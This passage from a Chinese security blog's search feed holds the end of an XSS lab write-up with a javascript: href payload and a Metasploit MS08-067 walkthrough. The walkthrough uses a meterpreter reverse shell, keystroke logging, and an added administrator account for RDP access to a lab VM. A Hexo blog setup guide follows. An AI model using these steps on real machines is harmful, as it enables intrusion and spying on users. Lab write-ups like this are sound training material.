class="line-numbers-rows"><span></span></span></code></pre><p>输完之后，点击图片，触发鼠标，即可绕过。</p><p><strong>注意：以上每一种方法的空格都很重要！！！</strong></p><p>或者将a标签的href更改为如下内容，利用javascript伪协议</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>javascript:alert(‘xss’)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h1><p>与level17同理</p><h1 id="level-19-level20"><a href="#level-19-level20" class="headerlink" title="level 19-level20"></a>level 19-level20</h1><p>这两关与之前的很相似，只是在于输入的onmouseover事件会被当作普通文本，而双引号又被过滤因此也不能闭合进行绕过，可以F12手动加onmouseover事件通关。</p>]]></content>
    
    
    <categories>
      
      <category>专项靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
      <tag>Web漏洞</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ms08-067的相关应用</title>
    <link href="/posts/5a76.html"/>
    <url>/posts/5a76.html</url>
    
    <content type="html"><![CDATA[<p>本篇文章介绍关于msfconsole模块中ms08-067漏洞的一些实例应用。</p><span id="more"></span><h1 id="实验背景："><a href="#实验背景：" class="headerlink" title="实验背景："></a>实验背景：</h1><p>    都是在虚拟机下进行的啦，靶机采用的是winxpens3，确保所用的靶机有相关的漏洞才能攻击成功哦。并且攻击机和靶机要处在同一局域网下才行哒，建议开启仅主机模式哦。还有一点，有些命令无效，可能是因为模式为普通用户模式，在命令前面使用sudo就好了，或者切换为root（su root)</p><h1 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h1><p>攻击机：kali             ip地址：192.168.127.139</p><p>靶机：winxpens3    ip地址：192.168.127.138</p><h1 id="ms08-067的相关应用"><a href="#ms08-067的相关应用" class="headerlink" title="ms08-067的相关应用"></a>ms08-067的相关应用</h1><h2 id="1、配置命令"><a href="#1、配置命令" class="headerlink" title="1、配置命令"></a>1、配置命令</h2><p>首先进入msfconsole界面，</p><pre class="line-numbers language-bash"><code class="language-bash">search ms08-067      <span class="token comment" spellcheck="true">#查找ms08-067漏洞</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到这个漏洞的基本信息：</p><img src="/posts/5a76/1.png" class><p>可以选择</p><pre class="line-numbers language-bash"><code class="language-bash">use 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用如下命令，一样的意思</p><pre class="line-numbers language-bash"><code class="language-bash">use exploit/windows/smb/ms08_067_netapi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择之后，发现提示信息，按照提示信息配置：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> payload windows/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/5a76/2.png" class><p>然后输入</p><pre class="line-numbers language-bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看哪些是yes,即必填,如果它的Current Setting为空，则要对它进行设置，如</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> RHOSTS 192.168.127.138     <span class="token comment" spellcheck="true">#设置靶机地址</span><span class="token keyword">set</span> LHOST 192.168.127.139      <span class="token comment" spellcheck="true">#设置攻击机地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2、运行攻击"><a href="#2、运行攻击" class="headerlink" title="2、运行攻击"></a>2、运行攻击</h2><p>完成前面的配置之后，运行：</p><pre class="line-numbers language-bash"><code class="language-bash">run       <span class="token comment" spellcheck="true">#或者使用exploit,来实现攻击</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功进入如下界面：</p><img src="/posts/5a76/3.png" class><h2 id="3、使用screenshot命令可对靶机界面进行截图："><a href="#3、使用screenshot命令可对靶机界面进行截图：" class="headerlink" title="3、使用screenshot命令可对靶机界面进行截图："></a>3、使用screenshot命令可对靶机界面进行截图：</h2><pre class="line-numbers language-bash"><code class="language-bash">screenshot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>截图默认保存在/home/kali目录下（命令下面会显示文件保存的路径），进入文件路径可以看到截图。</p><img src="/posts/5a76/4.png" class><h2 id="4、查看并关闭靶机打开进程"><a href="#4、查看并关闭靶机打开进程" class="headerlink" title="4、查看并关闭靶机打开进程"></a>4、查看并关闭靶机打开进程</h2><p>可以先使用ps命令查看靶机打开的进程号</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后可以使用kill关闭靶机的某个进程</p><p>比如，靶机此时打开了记事本，我在攻击上使用ps查看的进程号为2516（这个进程号是随机变化的哈），使用如下命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">kill</span> 2516<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可关闭通过攻击机关闭靶机的记事本进程</p><img src="/posts/5a76/5.png" class><h2 id="5、监听靶机键盘内容"><a href="#5、监听靶机键盘内容" class="headerlink" title="5、监听靶机键盘内容"></a>5、监听靶机键盘内容</h2><p>同样先使用ps查看靶机此时的进程及进程号，得到此时靶机记事本进程为484（靶机已经重新打开记事本进程）</p><p>然后使用：</p><pre class="line-numbers language-bash"><code class="language-bash">migrate 484        <span class="token comment" spellcheck="true">#484为靶机开启的进程号</span>keyscan_start      <span class="token comment" spellcheck="true">#开启监听靶机键盘</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后在靶机上任意输一些内容，回到kali，然后输入以下命令，即可查看监听到的键盘内容</p><pre class="line-numbers language-bash"><code class="language-bash">keyscan_dump       <span class="token comment" spellcheck="true">#得到监听内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/5a76/6.png" class><h2 id="6、利用3389端口远程登录靶机"><a href="#6、利用3389端口远程登录靶机" class="headerlink" title="6、利用3389端口远程登录靶机"></a>6、利用3389端口远程登录靶机</h2><p>在Windows上创建一个名称为zt密码为pass的用户，并提升为管理员权限</p><pre class="line-numbers language-bash"><code class="language-bash">net user zt pass /add                   <span class="token comment" spellcheck="true">#创建新用户，用户名为zt密码为pass</span>net localgroup Administrators zt /add   <span class="token comment" spellcheck="true">#将用户加入Administrators组</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>确保靶机的3389端口已经打开，可以在kali上使用nmap扫描靶机地址查看靶机是否开启3389端口。</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -F 192.168.127.138            <span class="token comment" spellcheck="true">#查看靶机是否开启3389端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/5a76/7.png" class><p>发现3389端口已经打开，进入下一步。</p><p>接下来重新打开一个终端，输入</p><pre class="line-numbers language-bash"><code class="language-bash">rdesktop 192.168.127.138      <span class="token comment" spellcheck="true">#远程登录靶机</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 回车后会自动弹出如图所示的登录窗口</p><img src="/posts/5a76/8.png" class><p>使用创建的账户zt,密码pass即可远程登录靶机</p><img src="/posts/5a76/9.png" class>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>metasploit</tag>
      
      <tag>操作系统漏洞</tag>
      
      <tag>远程登录</tag>
      
      <tag>ms08-067</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo+Github搭建博客</title>
    <link href="/posts/85e6.html"/>
    <url>/posts/85e6.html</url>
    
    <content type="html"><![CDATA[<p>本篇文章介绍了使用hexo+github创建博客的主要流程。<span id="more"></span>我也是在考虑各方因素之后，选择了github.io的方式。优点嘛，就是免费加开源yyds！好了，进入正题。</p><!--more--><h1 id="1、搭建本地环境"><a href="#1、搭建本地环境" class="headerlink" title="1、搭建本地环境"></a>1、搭建本地环境</h1><h2 id="1-1下载并安装nodejs"><a href="#1-1下载并安装nodejs" class="headerlink" title="1.1下载并安装nodejs"></a>1.1下载并安装<a href="https://nodejs.org/">nodejs</a></h2><p>安装时一路默认即可。</p><p>测试：打开cmd,输入以下测试，出现版本号即表示成功</p><pre class="line-numbers language-bash"><code class="language-bash">node -v<span class="token function">npm</span> -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/85e6/1.png" class><h2 id="1-2下载并安装git"><a href="#1-2下载并安装git" class="headerlink" title="1.2下载并安装git"></a>1.2下载并安装<a href="https://git-scm.com/downloads">git</a></h2><p>安装时也一路默认即可。</p><p>测试：打开cmd,输入如下测试，出现版本号</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> --version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/85e6/2.png" class><p>并且在桌面右键鼠标，出现如下两个图标即表示成功</p><img src="/posts/85e6/3.png" class><h1 id="2、注册Github账户（已有账户的可跳过此步）"><a href="#2、注册Github账户（已有账户的可跳过此步）" class="headerlink" title="2、注册Github账户（已有账户的可跳过此步）"></a>2、注册Github账户（已有账户的可跳过此步）</h1><h2 id="2-1进入github官网，注册账号即可"><a href="#2-1进入github官网，注册账号即可" class="headerlink" title="2.1进入github官网，注册账号即可"></a>2.1进入<a href="https://github.com/">github</a>官网，注册账号即可</h2><h2 id="2-2注册完成后，连接github"><a href="#2-2注册完成后，连接github" class="headerlink" title="2.2注册完成后，连接github"></a>2.2注册完成后，连接github</h2><p>在桌面右键，选择Git Bash Here，设置用户名和邮箱（创建github账户时的用户名和邮箱）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> config --global user.name <span class="token string">"Github 用户名"</span><span class="token function">git</span> config --global user.email <span class="token string">"Github 邮箱"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="3、添加加密密钥"><a href="#3、添加加密密钥" class="headerlink" title="3、添加加密密钥"></a>3、添加加密密钥</h1><h2 id="3-1创建ssh密钥"><a href="#3-1创建ssh密钥" class="headerlink" title="3.1创建ssh密钥"></a>3.1创建ssh密钥</h2><p>先检查一下本地是否有.ssh文件夹：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> ~/.ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果没有，则直接进入接下这一步，有的话，可以修改路径等</p><pre class="line-numbers language-bash"><code class="language-bash">ssh-keygen -t rsa -C <span class="token string">"Github 邮箱"</span> <span class="token comment" spellcheck="true">#注意ssh-keygen是直接连起来的，中间没有空格</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>默认回车，创建完成后，可得到两个文件（因为.ssh为隐藏文件，如果没有找到.ssh项目，可以先检查一下自己的文件是否勾选隐藏的项目。.ssh的默认路径为：C:\users\用户名.ssh)</p><pre class="line-numbers language-bash"><code class="language-bash">id_rsaid_rsa.pub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3-2添加ssh密钥到github账户"><a href="#3-2添加ssh密钥到github账户" class="headerlink" title="3.2添加ssh密钥到github账户"></a>3.2添加ssh密钥到github账户</h2><p>将id_rsa.pub的内容全部复制下来，</p><p>进入github，点击setting页面，然后选择左边栏的 SSH and GPG keys，点击 New SSH key。</p><img src="/posts/85e6/4.png" class><p>Title随便命令，将复制下来的id_rsa.pub的内容粘贴到Key中，点击Add SSH key 完成添加。</p><img src="/posts/85e6/5.png" class><h2 id="3-3验证连接"><a href="#3-3验证连接" class="headerlink" title="3.3验证连接"></a>3.3验证连接</h2><p>在桌面右击鼠标，选择Git Bash Here，输入</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ssh</span> -T git@github.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>出现以下图片即表示成功：</p><img src="/posts/85e6/6.jpg" class><h1 id="4、创建github仓库"><a href="#4、创建github仓库" class="headerlink" title="4、创建github仓库"></a>4、创建github仓库</h1><ul><li><p>GitHub 主页右上角加号，选择 New repository</p></li><li><p>Repository name 中输入：用户名.github.io</p></li><li><p>Description 选填</p></li><li><p>勾选 “Add a README file”</p></li></ul><p><strong>注意：最新版的GitHub的默认分支为main,从下图可以看到（也可以自行更改为其他分支）</strong></p><p>创建后，博客地址为：https://用户名.github.io</p><img src="/posts/85e6/7.png" class><h1 id="5、安装hexo"><a href="#5、安装hexo" class="headerlink" title="5、安装hexo"></a>5、安装hexo</h1><h2 id="5-1安装"><a href="#5-1安装" class="headerlink" title="5.1安装"></a>5.1安装</h2><p>使用我们前面的环境npm即可一键安装hexo程序</p><p>鼠标右击，选择Git Bash Here，输入：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> -g hexo-cli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-2测试"><a href="#5-2测试" class="headerlink" title="5.2测试"></a>5.2测试</h2><p>检查是否安装成功：</p><p>在cmd或者Git Bash Here里面输入：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>出现相关版本号即可</p><img src="/posts/85e6/8.jpg" class><h2 id="5-3初始化并安装所需组件："><a href="#5-3初始化并安装所需组件：" class="headerlink" title="5.3初始化并安装所需组件："></a>5.3初始化并安装所需组件：</h2><p>先新建一个文件夹，在该文件夹下右击鼠标，选择Git Bash Here，输入：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo init    <span class="token comment" spellcheck="true">#初始化</span><span class="token function">npm</span> <span class="token function">install</span>  <span class="token comment" spellcheck="true">#安装组件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>或者，直接这样运行：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo init 文件名称<span class="token function">cd</span> 文件路径<span class="token function">npm</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>完成后，启动服务器进行预览：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo g     <span class="token comment" spellcheck="true">#生成静态页面，或者hexo generate</span>hexo s     <span class="token comment" spellcheck="true">#启动服务，或者hexo server</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此时访问：<a href="http://localhost:4000，出现hexo默认页面，表示安装成功">http://localhost:4000，出现hexo默认页面，表示安装成功</a></p><img src="/posts/85e6/9.png" class><h1 id="6、部署hexo到GitHub-Pages"><a href="#6、部署hexo到GitHub-Pages" class="headerlink" title="6、部署hexo到GitHub Pages"></a>6、部署hexo到GitHub Pages</h1><p>前面五步已经能够实现在本地访问hexo,我们的真正目的是使其部署到GitHub Pages，通过网络能够访问它。</p><h2 id="6-1安装git部署插件hexo-deployer-git"><a href="#6-1安装git部署插件hexo-deployer-git" class="headerlink" title="6.1安装git部署插件hexo-deployer-git"></a>6.1安装git部署插件hexo-deployer-git</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6-2修改-config-yml站点配置文件"><a href="#6-2修改-config-yml站点配置文件" class="headerlink" title="6.2修改_config.yml站点配置文件"></a>6.2修改_config.yml站点配置文件</h2><p>在你之前创建的目录下，找到_config.yml文件，并用记事本打开，</p><p>修改末尾的Deployment 部分,</p><p><strong>注意：冒号后面一定记得有个空格！！！</strong></p><pre class="line-numbers language-bash"><code class="language-bash">deploy:type: <span class="token function">git</span>repository: git@github.com:用户名/用户名.github.io.gitbranch: main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，</p><p>repository后面的地址可从如下图所示直接复制过来</p><img src="/posts/85e6/10.png" class><p>branch后面是前面提过的默认分支，默认为main,可以修改为其他的，我把默认分支修改为了master（那就要修改为branch: master)，修改方法如下：</p><img src="/posts/85e6/11.png" class><h2 id="6-3发布文章"><a href="#6-3发布文章" class="headerlink" title="6.3发布文章"></a>6.3发布文章</h2><p>进入之前所创建的hexo的所在目录，右键Git Bash Here ，输入</p><pre class="line-numbers language-bash"><code class="language-bash">hexo new <span class="token string">"first"</span> <span class="token comment" spellcheck="true">#创建名为"first"的文章，""里面的标题可自行命名</span>hexo g <span class="token comment" spellcheck="true">#生成静态页面</span>hexo d <span class="token comment" spellcheck="true">#将文章部署到GitHub pages，或者hexo deploy</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，访问我们的GitHub域名，即：https://用户名.github.io 就可以看到hexo网站啦！`</p><h1 id="常用的hexo命令"><a href="#常用的hexo命令" class="headerlink" title="常用的hexo命令"></a>常用的hexo命令</h1><pre class="line-numbers language-bash"><code class="language-bash">hexo new <span class="token string">"name"</span>         <span class="token comment" spellcheck="true"># 新建文章</span>hexo new page <span class="token string">"name"</span>    <span class="token comment" spellcheck="true"># 新建页面</span>hexo g                  <span class="token comment" spellcheck="true"># 生成页面</span>hexo d                  <span class="token comment" spellcheck="true"># 部署</span>hexo g -d               <span class="token comment" spellcheck="true"># 生成页面并部署</span>hexo s                  <span class="token comment" spellcheck="true"># 本地预览</span>hexo clean              <span class="token comment" spellcheck="true"># 清除缓存和已生成的静态文件</span>hexo <span class="token function">help</span>               <span class="token comment" spellcheck="true"># 帮助</span>hexo --debug            <span class="token comment" spellcheck="true"># 调试模式</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <categories>
      
      <category>零碎</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
